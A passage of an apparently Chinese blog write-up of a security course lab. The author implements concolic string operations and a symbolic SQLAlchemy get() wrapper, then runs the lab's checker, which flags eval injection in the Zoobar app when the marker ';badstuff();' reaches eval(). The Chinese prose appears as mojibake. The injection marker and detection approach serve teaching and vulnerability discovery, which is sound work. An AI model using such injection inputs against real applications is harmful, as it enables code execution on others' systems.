class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Exercise 7: your code here.</span><br><span class="hljs-comment">## Implement symbolic versions of string length (override __len__)</span><br><span class="hljs-comment">## and contains (override __contains__).</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__len__</span>(<span class="hljs-params">self</span>):<br>  <span class="hljs-keyword">return</span> concolic_int(sym_length(ast(self)), <span class="hljs-built_in">len</span>(self.__v))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__contains__</span>(<span class="hljs-params">self, o</span>):<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(o, concolic_str):<br>    res = o.__v <span class="hljs-keyword">in</span> self.__v<br>  <span class="hljs-keyword">else</span>:<br>    res = o <span class="hljs-keyword">in</span> self.__v<br>  <span class="hljs-keyword">return</span> concolic_bool(sym_contains(ast(self), ast(o)), res)<br></code></pre></td></tr></table></figure><p>è¿è¡Œï¼ŒæˆåŠŸé€šè¿‡ Exercise 7ï¼š</p><p><img src="https://s2.loli.net/2022/12/19/CNrSIEkOe54tuoB.png" alt="image.png"></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦åœ¨ Zoobar ä¸­å®Œæˆä¸€ä¸ª <code>concolic HTTP request</code>ï¼Œå› æ­¤å¾…æŸ¥è¯¢çš„ username ä¹Ÿå°†ä¸ºä¸€ä¸ªæ··åˆå€¼ï¼ˆç”± HTTP cookie å¸¦æ¥ï¼‰ï¼Œäºæ˜¯æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦åœ¨ SQL æŸ¥è¯¢ä¸Šåº”ç”¨æ··åˆæ‰§è¡Œï¼Œä½† SQLite ç”± C è€Œé Python ç¼–å†™ï¼Œå› æ­¤æˆ‘ä»¬ä¸èƒ½ç›´æ¥ä¿®æ”¹å…¶å†…éƒ¨ä»£ç </p><p>äºæ˜¯æ¥ä¸‹æ¥æ¥åˆ° Exercise8ï¼Œå¯¹ SQL çš„ <code>get()</code> åº”ç”¨ä¸€å±‚ wrapper ä»¥å¯¹ SQL è¯­å¥çš„ç»“æœåº”ç”¨æ··åˆæ‰§è¡Œï¼š</p><blockquote><p><strong>Exercise 8.</strong> Figure out how to handle the SQL database so that the concolic engine can create constraints against the data returned by the database. To help you do this, weâ€™ve written an empty wrapper around the sqlalchemy <code>get</code> method, in <code>symex/symsql.py</code>. Implement this wrapper so that concolic execution can try all possible records in a database. Examine <strong>./check-symex-sql.py</strong> to see how we are thinking of performing database lookups on concolic values.</p><p>You will likely need to consult the reference for the <a href="https://docs.sqlalchemy.org/en/11/orm/query.html">SQLalchemy query object</a> to understand what the behavior of <code>get</code> should be and what your replacement implementation should be doing.</p><p>Run <strong>./check-symex-sql.py</strong> (or just run <strong>make check</strong>) to check that your answer to this exercise works correctly.</p></blockquote><p>é‚£æˆ‘ä»¬å…ˆçœ‹çœ‹ <code>./check-symex-sql.py</code> é‡Œé¢çš„ä¸»ä½“é€»è¾‘ï¼ˆå…³äº SQLalchemy åº“ç›¸å…³çš„å¯ä»¥å…ˆçœ‹ <a href="https://docs.sqlalchemy.org/en/11/orm/query.html">SQLalchemy query object</a> ï¼‰ï¼Œé¦–å…ˆå£°æ˜äº† <code>Test1Base</code> å’Œ <code>Test2Base</code>ï¼Œè¿™ä¸¤ä¸ªç›¸å½“äºä¸¤ç»„ä¸åŒçš„æµ‹è¯•ç”¨ä¾‹ï¼Œæˆ‘ä»¬ä»…åˆ†æå…¶ä¸­ä¸€ç»„å³å¯ï¼Œä¹‹åå®šä¹‰äº†ç±» <code>Test1</code> ç»§æ‰¿è‡ª <code>Test1Base</code>ï¼Œå¹¶ä¸ºè¯¥æ•°æ®åº“è®¾ç½®äº†ä¸¤åˆ—ï¼Œå…¶ä¸­ <code>name</code> ä¸ºä¸»é”®ï¼š</p><blockquote><p>è¿™é‡ŒæŒ‰ç…§ç¬”è€…çš„ç†è§£ï¼Œä¸€ä¸ª <code>Test1</code> å®ä¾‹è¡¨ç¤ºçš„åº”è¯¥æ˜¯åœ¨è¯¥æ•°æ®åº“ä¸­ä¸€è¡Œçš„æ•°æ®</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">Test1Base = declarative_base()<br>Test2Base = declarative_base()<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1</span>(<span class="hljs-title class_ inherited__">Test1Base</span>):<br>    __tablename__ = <span class="hljs-string">&quot;test1&quot;</span><br>    name = Column(String(<span class="hljs-number">128</span>), primary_key=<span class="hljs-literal">True</span>)<br>    value = Column(Integer)<br></code></pre></td></tr></table></figure><p>ä¹‹åæ˜¯æ•°æ®åº“åˆå§‹åŒ–å·¥ä½œï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbsetup</span>(<span class="hljs-params">name, base</span>):<br>    dbfile = os.path.join(dbdir, <span class="hljs-string">&quot;%s.db&quot;</span> % name)<br>    engine = create_engine(<span class="hljs-string">&#x27;sqlite:///%s&#x27;</span> % dbfile,<br>                           isolation_level=<span class="hljs-string">&#x27;SERIALIZABLE&#x27;</span>)<br>    base.metadata.create_all(engine)<br>    session = sessionmaker(bind=engine)<br>    <span class="hljs-keyword">return</span> session()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test1_setup</span>():<br>    <span class="hljs-keyword">return</span> dbsetup(<span class="hljs-string">&quot;test1&quot;</span>, Test1Base)<br></code></pre></td></tr></table></figure><p>åœ¨ <code>test_f()</code> ä¸­ä¼šè°ƒç”¨ <code>test1_setup()</code> è¿›è¡Œæ•°æ®åº“ <code>&quot;test1&quot;</code> çš„åˆ›å»ºï¼Œå¹¶åˆ›å»ºä¸€ä¸ªæ··åˆå­—ç¬¦ä¸² <code>s</code>ï¼Œå°†å…¶ä½œä¸ºå‚æ•°ç»™åˆ°æ•°æ®åº“çš„ get å‡½æ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_f</span>():<br>    db = test1_setup()<br>    s = fuzzy.mk_str(<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    r = db.query(Test1).get(s)<br>    <span class="hljs-keyword">if</span> r <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        v = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">else</span>:<br>        v = r.value<br>    <span class="hljs-keyword">return</span> v<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>query()</code> å±•å¼€æ¥å…¶å®æ˜¯ <code>SELECT test1.nameSELECT test1.name AS test1_name, test1.value AS test1_value FROM test1</code> è¿™æ ·çš„ SQL è¯­å¥ï¼ˆæ¯”è¾ƒç¬¨çš„åŠæ³•å°±æ˜¯å¯ä»¥é€šè¿‡åœ¨ <code>get()</code> ä¸­æ‰“å° <code>query</code> çš„æ–¹å¼æŸ¥çœ‹ï¼‰ï¼Œå…¶ä¸­é€‰æ‹©çš„éƒ½æ˜¯æˆ‘ä»¬ä¸º <code>Test1</code> ç±»æ‰€å®šä¹‰çš„å˜é‡ï¼Œè€Œ <code>get()</code> çš„åŸå§‹ä½œç”¨åˆ™ä¸ºä»æŸ¥è¯¢ç»“æœä¸­é€‰æ‹©ç¬¦åˆæ¡ä»¶çš„ä¸€è¡Œ</p><p>å®Œæˆä¸Šè¿°å®šä¹‰ä¹‹åï¼Œåœ¨æ–‡ä»¶ä¸­é¦–å…ˆè°ƒç”¨ <code>test1_setup()</code> è¿›è¡Œæ•°æ®åº“ <code>&quot;test1&quot;</code> çš„åˆ›å»ºï¼Œå¹¶æ·»åŠ äº†ä¸¤è¡Œæ•°æ®ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">t1 = test1_setup()<br>t1a = Test1()<br>t1a.name = <span class="hljs-string">&#x27;foo&#x27;</span><br>t1a.value = <span class="hljs-number">924</span><br>t1.add(t1a)<br>t1b = Test1()<br>t1b.name = <span class="hljs-string">&#x27;barr&#x27;</span><br>t1b.value = <span class="hljs-number">22</span><br>t1.add(t1b)<br>t1.commit()<br></code></pre></td></tr></table></figure><p>æœ€åå¯¹ <code>test_f()</code> åº”ç”¨æ··åˆæ‰§è¡Œï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Testing f..&#x27;</span>)<br>f_results = fuzzy.concolic_execs(test_f, verbose=<span class="hljs-number">10</span>)<br>f_expected = (<span class="hljs-number">924</span>, <span class="hljs-number">22</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">all</span>(x <span class="hljs-keyword">in</span> f_results <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> f_expected):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Found all cases for f&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Missing some cases for f:&quot;</span>, <span class="hljs-built_in">set</span>(f_expected) - <span class="hljs-built_in">set</span>(f_results))<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æ¥åˆ°æˆ‘ä»¬éœ€è¦è¡¥å…¨ä»£ç çš„ <code>symex/symsql.py</code> å½“ä¸­ï¼Œæ•´ç†é€»è¾‘éå¸¸ç®€å•ï¼Œåªå®šä¹‰äº†ä¸€ä¸ªå¾…æˆ‘ä»¬è¡¥å…¨çš„ <code>newget()</code>ï¼Œå¹¶ç”¨å…¶æ›¿æ¢æ‰äº†åŸæœ‰çš„ <code>get()</code> å‡½æ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## This module wraps SQLalchemy&#x27;s methods to be friendly to</span><br><span class="hljs-comment">## symbolic / concolic execution.</span><br><br><span class="hljs-keyword">import</span> sqlalchemy.orm<br><span class="hljs-keyword">from</span> . <span class="hljs-keyword">import</span> fuzzy<br><br>oldget = sqlalchemy.orm.query.Query.get<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">newget</span>(<span class="hljs-params">query, primary_key</span>):<br>  <span class="hljs-comment">## Exercise 8: your code here.</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment">## Find the object with the primary key &quot;primary_key&quot; in SQLalchemy</span><br>  <span class="hljs-comment">## query object &quot;query&quot;, and do so in a symbolic-friendly way.</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment">## Hint: given a SQLalchemy row object r, you can find the name of</span><br>  <span class="hljs-comment">## its primary key using r.__table__.primary_key.columns.keys()[0]</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>sqlalchemy.orm.query.Query.get = newget<br></code></pre></td></tr></table></figure><p>å‚æ•° <code>query</code> å…¶å®å°±æ˜¯åé¢åˆ›å»ºçš„ Query å¯¹è±¡ä¸­çš„ <code>self</code>ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬çœ‹çœ‹ SQLAlchemy æ–‡æ¡£ä¸­æœ‰æ²¡æœ‰æ¯”è¾ƒæœ‰ç”¨çš„æ–¹æ³•ï¼Œå®é™…ä¸Šåœ¨æ•°æ®åº“çš„ <code>å¢åˆ æ”¹æŸ¥</code> å½“ä¸­ï¼Œå¯¹äºæœ¬é¢˜è€Œè¨€æˆ‘ä»¬åªéœ€è¦å…³æ³¨â€œæŸ¥â€ï¼Œæ³¨æ„åˆ°æœ‰è¿™æ ·ä¸€ä¸ªæ–¹æ³•å¯ä»¥å°†æŸ¥è¯¢ç»“æœä»¥åˆ—è¡¨çš„å½¢å¼è¿”å›ï¼š</p><p><img src="https://s2.loli.net/2022/12/21/CKVXIAh7OWpvobk.png" alt="image.png"></p><p>æ–‡æ¡£é‡Œæ²¡æœ‰ä»”ç»†è¯´æ¸…æ¥šï¼ˆ <s>ä¹Ÿå¯èƒ½æ˜¯ğŸ‘´æ²¡ä»”ç»†çœ‹</s> ï¼‰ï¼Œç¬”è€…å®æµ‹äº†ä¸€ä¸‹ï¼Œè¿”å›çš„åˆ—è¡¨çš„æˆå‘˜çš†ä¸º <code>Test1</code> æˆ– <code>Test2</code> ç±»å‹çš„å¯¹è±¡å®ä¾‹ï¼Œå³ <code>ä¸€è¡Œçš„æ•°æ®</code>ï¼Œè¿™é‡Œæˆ‘ä»¬åŒæ—¶ä¹Ÿå¯ä»¥çœ‹å‡ºåœ¨ <code>test1</code> æ•°æ®åº“ä¸­æœ‰ä¸¤ä¸ª <code>Test1</code>ï¼ˆä¸¤è¡Œï¼‰ï¼Œåˆšå¥½å¯¹åº”ä¸€å¼€å§‹æ·»åŠ è¿›å»çš„ä¸¤è¡Œï¼š</p><p><img src="https://s2.loli.net/2022/12/21/WLK4erN95ngCFil.png" alt="image.png"></p><p>é‚£ä¹ˆæˆ‘ä»¬çš„æ€è·¯å…¶å®å°±æ¯”è¾ƒæ¸…æ™°äº†ï¼Œ<code>get()</code> çš„ç¬¬äºŒä¸ªå‚æ•°ä¸º <code>primary_key</code>ï¼Œå³æˆ‘ä»¬åªéœ€è¦å¯¹æ¯”æŸ¥è¯¢ç»“æœæ‰¾åˆ°å…¶ä¸­ <code>primary_key</code> çš„å€¼ä¸ä¼ å…¥çš„å‚æ•°å€¼ç›¸åŒçš„é‚£ä¸€è¡Œå¹¶å°†å…¶è¿”å›å³å¯</p><p>åœ¨å¾…æ··åˆæ‰§è¡Œå‡½æ•° <code>test_f()</code> ä¸ <code>test_g()</code> å½“ä¸­ä¼ å…¥çš„ <code>primary_key()</code> çš†ä¸º <code>concolic</code> ç±»å‹å˜é‡ï¼Œè€Œæˆ‘ä»¬å·²ç»å®Œæˆäº† <code>concolic_int</code> ä¸ <code>concolic_str</code> çš„ <code>__cmp__</code> è¿ç®—ç¬¦é‡è½½ï¼Œå› æ­¤åœ¨é‡å†™çš„ get å‡½æ•°ä¸­ç›´æ¥ä½¿ç”¨ <code>==</code> è¿›è¡Œå¯¹æ¯”å³å¯</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè™½ç„¶æˆ‘ä»¬çŸ¥é“ <code>Test1</code> çš„ä¸»é”®ä¸º <code>name</code>ï¼Œä½†è¿™é‡Œç›¸æ¯”èµ·ç›´æ¥ä½¿ç”¨ <code>row.name</code>ï¼Œæˆ‘ä»¬éœ€è¦ä¸”åº”å½“å†™ä¸€ä¸ª<strong>æ›´ä¸ºé€šç”¨çš„æ–¹æ³•</strong>ï¼Œåœ¨æ³¨é‡Šä¸­æç¤ºæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>r.__table__.primary_key.columns.keys()[0]</code> è·å–ä¸»é”®åçš„å­—ç¬¦ä¸²ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Python çš„å†…ç½®æ–¹æ³• <code>getattr()</code> æ¥è·å–ä¸»é”®çš„å€¼ï¼Œå› æ­¤æœ€åçš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">newget</span>(<span class="hljs-params">query, primary_key</span>):<br>  <span class="hljs-comment">## Exercise 8: your code here.</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment">## Find the object with the primary key &quot;primary_key&quot; in SQLalchemy</span><br>  <span class="hljs-comment">## query object &quot;query&quot;, and do so in a symbolic-friendly way.</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment">## Hint: given a SQLalchemy row object r, you can find the name of</span><br>  <span class="hljs-comment">## its primary key using r.__table__.primary_key.columns.keys()[0]</span><br>  rows = query.<span class="hljs-built_in">all</span>()<br><br>  <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> query.<span class="hljs-built_in">all</span>():<br>    primary_key_in_row = <span class="hljs-built_in">getattr</span>(r, r.__table__.primary_key.columns.keys()[<span class="hljs-number">0</span>])<br>    <span class="hljs-keyword">if</span> primary_key_in_row == primary_key:<br>      <span class="hljs-keyword">return</span> r<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br></code></pre></td></tr></table></figure><p>è¿è¡Œï¼ŒæˆåŠŸé€šè¿‡ Exercise 8ï¼š</p><p><img src="https://s2.loli.net/2022/12/21/wIzaOhY4bJxsNgq.png" alt="image.png"></p><blockquote><p>æ³¨æ„è¿™é‡Œéœ€è¦<strong>é¢å¤–é€šè¿‡ Exercise 9 çš„ç¬¬ä¸€é¡¹æ‰è¡¨ç¤ºåšå¯¹äº†</strong>ï¼Œå› ä¸ºåé¢éœ€è¦å€ŸåŠ©è¿™é‡Œçš„ç¬¦å·æ‰§è¡Œä»£ç æ¼”ç¤ºä¸€äº›ä¸œè¥¿</p></blockquote><p>ç°åœ¨æˆ‘ä»¬å¯ä»¥å¼€å§‹å¯¹ Zoobar åº”ç”¨æˆ‘ä»¬çš„æ··åˆæ‰§è¡Œæ¡†æ¶äº†ï¼Œæˆ‘ä»¬é¦–å…ˆå°è¯•è¿è¡Œ <code>./check-symex-zoobar.py</code>ï¼Œåœ¨å…¶ä¸­æœ‰ç€å¯¹ Zoobar ä½¿ç”¨ç¬¦å·è¾“å…¥çš„ç›¸å…³é€»è¾‘ï¼Œä¸”ä¸ºäº†è®©æ··åˆæ‰§è¡Œèƒ½å¤Ÿå¿«é€Ÿç»“æŸï¼Œå…¶è¿‡åº¦çº¦æŸäº†ç»™äºˆ Zoobar çš„è¾“å…¥ï¼Œæ­¤å¤–æ‰€æœ‰çš„ HTTP è¯·æ±‚æ–¹æ³•ï¼ˆäº <code>environ['REQUEST_METHOD']</code> ä¸­ï¼‰çš†ä¸º <code>GET</code>ï¼Œä¸”è¯·æ±‚çš„æ‰€æœ‰ UQLï¼ˆäº <code>environ['PATH_INFO']</code> ä¸­ï¼‰çš†ä»¥ <code>trans</code> èµ·å§‹</p><p>ç›¸è¾ƒäºç›´æ¥è¿è¡Œï¼ŒLab æ›´æ¨èä½¿ç”¨ <code>script</code> æ¥è¿è¡Œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">script -c ./check-symex-zoobar.py</span><br></code></pre></td></tr></table></figure><p>ä¹‹åå±å¹•ä¸Šä¼šæŒç»­æ‰“å‡ºä¸€å †ä¿¡æ¯ï¼š</p><p><img src="https://s2.loli.net/2022/12/21/D79tqYuBGXFHPjd.png" alt="image.png"></p><p>å¤§æ¦‚åå‡ ç§’åç»“æŸï¼Œè¿­ä»£çš„æ•°é‡è¡¨ç¤ºä¸åŒçš„è·¯å¾„ï¼š</p><p><img src="https://s2.loli.net/2022/12/21/UHD4s6MIq9pRCBc.png" alt="image.png"></p><blockquote><p>å’Œå®éªŒæ‰‹å†Œä¸­ä¸åŒçš„æ˜¯ç¬”è€…è¿™é‡Œæœ‰ <code>142 iterations</code>ï¼Œä½†åœ¨å®éªŒæ‰‹å†Œé‡Œæ˜¯ <code>139</code>ï¼Œè¿™é‡Œæš‚ä¸”å…ˆä¸ç®¡ï¼ˆ</p></blockquote><p>ç”±äº Zoobar ç”± Python ç¼–å†™ï¼Œæ•…ä¸ä¼šæœ‰å†…å­˜æŸåè¿™ä¸€ç±»çš„æ¼æ´ï¼ˆè¿™å¥è¯æ˜¯å®éªŒæ‰‹å†Œè¯´çš„ï¼Œä½†æ˜¯<a href="https://www.cvedetails.com/cve/CVE-2021-3177/"> CVE-2021-3177</a>å’Œä¸€ä¼—å…¶ä»– CVE è¡¨ç¤ºï¼šæ€ä¹ˆä¼šæ˜¯å‘¢ï¼Ÿï¼‰ï¼Œå› æ­¤æˆ‘ä»¬æ²¡æ³•ç«‹åˆ»è¾¨æ˜åœ¨è¿™ä¸€ç™¾å¤šè·¯å¾„ä¸­æ˜¯å¦å­˜åœ¨é—®é¢˜ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å€ŸåŠ©ä¸€äº›æ˜¾å¼çš„ä¸å˜é‡ï¼ˆinvariantï¼‰æ¥æ•æ‰è¡¨ç¤ºå®‰å…¨é—®é¢˜çš„æƒ…å†µ</p><p>Lab å·²ç»å®ç°äº†çš„ä¸€ä¸ªä¸å˜é‡ä¾¿æ˜¯ eval injectionâ€”â€”å³å¯¹ <code>eval()</code> çš„å‚æ•°è¿›è¡Œæ³¨å…¥ï¼Œåœ¨ <code>symex/symeval.py</code> ä¸­ Lab ç»™å‡ºäº†å¯¹è¿™ç§æƒ…å†µçš„æ£€æŸ¥æ€è·¯ï¼šè‹¥ä¼ ç»™ <code>eval()</code> çš„å­—ç¬¦ä¸²å¯ä»¥åŒ…å«  <code>;badstuff();</code> ï¼Œè¯´æ˜æˆ‘ä»¬å‘ç°äº†ä¸€ä¸ª eval injection æ¼æ´â€”â€”ç”±æ­¤æˆ‘ä»¬å¯ä»¥è®©æ··åˆæ‰§è¡Œç³»ç»Ÿå»å°è¯•æ„å»ºèƒ½åŒ…å«è¯¥å­ä¸²çš„å­—ç¬¦ä¸²</p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æŸ¥çœ‹ Zoobar ä¸­æ˜¯å¦å­˜åœ¨ eval injection æ¼æ´ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">script -c ./check-symex-zoobar.py | grep <span class="hljs-string">&quot;Exception: eval injection&quot;</span></span><br></code></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹ï¼Œå‘ç°äº†ä¸¤ä¸ª eval injectionï¼š</p><p><img src="https://s2.loli.net/2022/12/21/YslcqeuVP2C6Ni7.png" alt="image.png"></p><p>ç°åœ¨æˆ‘ä»¬æ¥çœ‹  <code>symex/symeval.py</code>  çš„å†…éƒ¨é€»è¾‘ï¼Œå…¶é€»è¾‘æ¯”è¾ƒç®€å•ï¼Œä¸»è¦å°±æ˜¯ç»™å†…ç½®çš„ <code>eval()</code> å¥—äº†ä¸€å±‚ wrapperï¼Œæ£€æŸ¥å‚æ•°æ˜¯å¦å¸¦æœ‰  <code>;badstuff();</code> å­—ç¬¦ä¸²ï¼Œè‹¥æ˜¯åˆ™ç›´æ¥æŠ›å¼‚å¸¸ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">real_eval = builtins.<span class="hljs-built_in">eval</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">myeval</span>(<span class="hljs-params">expr, <span class="hljs-built_in">globals</span> = <span class="hljs-literal">None</span>, <span class="hljs-built_in">locals</span> = <span class="hljs-literal">None</span></span>):<br>  <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;;badstuff();&#x27;</span> <span class="hljs-keyword">in</span> expr:<br>    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;eval injection&quot;</span>)<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">locals</span> <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">globals</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-built_in">locals</span> = <span class="hljs-built_in">globals</span><br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">locals</span> <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">globals</span> <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    frame = inspect.currentframe()<br>    <span class="hljs-keyword">try</span>:<br>      <span class="hljs-built_in">locals</span> = frame.f_back.f_locals<br>      <span class="hljs-built_in">globals</span> = frame.f_back.f_globals<br>    <span class="hljs-keyword">finally</span>:<br>      <span class="hljs-keyword">del</span> frame<br><br>  <span class="hljs-comment">## Try to evaluate the expression as an integer</span><br>  v = str_to_small_int(expr)<br>  <span class="hljs-keyword">if</span> v <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">return</span> v<br><br>  <span class="hljs-keyword">return</span> real_eval(expr, <span class="hljs-built_in">globals</span>, <span class="hljs-built_in">locals</span>)<br>builtins.<span class="hljs-built_in">eval</span> = myeval<br></code></pre></td></tr></table></figure><p>è€Œåœ¨ <code>check-symex-zoobar.py</code> å½“ä¸­ï¼Œåº”ç”¨äº†æ··åˆæ‰§è¡Œæ¡†æ¶çš„ä¸º <code>test_stuff()</code> å‡½æ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">fuzzy.concolic_execs(test_stuff, maxiter=<span class="hljs-number">500</span>, verbose=<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬æš‚ä¸”å…ˆä¸å…³æ³¨ Zoobar çš„å®ç°ä¸ºä½•ï¼Œæˆ‘ä»¬ä¸»è¦å…³æ³¨å¦‚ä½•ä½¿ç”¨æˆ‘ä»¬çš„æ··åˆæ‰§è¡Œç³»ç»Ÿæ¥å¯»æ‰¾å…¶ä¸­çš„æ¼æ´ï¼Œåœ¨ <code>test_stuff()</code> ä¸­å®é™…ä¸Šæ˜¯é€šè¿‡å°†éƒ¨åˆ†å‚æ•°è®¾ç½®ä¸ºæ··åˆå€¼æ¥è¿›è¡Œæ··åˆæ‰§è¡Œï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_stuff</span>():<br>  <span class="hljs-comment"># Zoobaråˆå§‹åŒ–å·¥ä½œ</span><br>  pdb = zoobar.zoodb.person_setup()<br>  pdb.query(zoobar.zoodb.Person).delete()<br>  <span class="hljs-comment">##...</span><br><br>  <span class="hljs-comment">## è®¾ç½®ç¯å¢ƒå˜é‡</span><br>  environ = &#123;&#125;<br>  <span class="hljs-comment">##...</span><br>  environ[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>] = fuzzy.mk_str(<span class="hljs-string">&#x27;referrer&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>  environ[<span class="hljs-string">&#x27;HTTP_COOKIE&#x27;</span>] = fuzzy.mk_str(<span class="hljs-string">&#x27;cookie&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br><br>  <span 